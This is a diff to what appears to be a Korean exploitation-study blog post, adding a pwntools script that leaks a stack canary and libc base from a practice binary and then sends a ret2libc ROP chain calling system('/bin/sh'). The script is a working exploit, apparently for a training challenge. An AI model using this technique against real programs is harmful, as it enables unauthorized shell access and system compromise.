@@ -150,7 +150,42 @@ pwndbg> backtrace
 (ROPgadget 사용 방법은 전 포스팅 Chapter4에 소개되어 있으므로 생략하겠습니다.)
 
 - 익스플로잇
+```python
+from pwn import *
 
+p = process('./prob')
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def read(idx : int) :
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b': ', str(idx).encode())
+    return p.recvline()[:-1]
+
+def write(idx : int, msg : bytes) :
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendafter(b'> ', msg)
+
+write(4, b'a' * 0x99)
+canary = u64(b'\x00' + read(4)[0x99:][:7])
+print("canary = " + hex(canary))
+
+write(4, b'a' * 0xa8)
+l.address = u64(read(4)[0xa8:][:6] + b'\x00' * 2) - 0x29d90
+print("libc_base = " + hex(l.address))
+
+ret = 0x40101a
+binsh = list(l.search(b'/bin/sh'))[0]
+system = l.sym['system']
+pop_rdi = 0x2a3e5 + l.address
+payload = b'a' * 0x98 + p64(canary) + b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
+write(4, payload)
+
+p.sendlineafter(b'> ', b'3')
+p.interactive()
+```
+
+PS : 필자는 `/bin/sh` 문자열 찾는 방법으로 `list(l.search(b'/bin/sh'))[0]`을 선호합니다. 잘 모르셨다면 이 방법을 추천하
 ## 피드백
 
 5장과 6장이 매우 유사한데 둘 다 넣을 필요가 있나
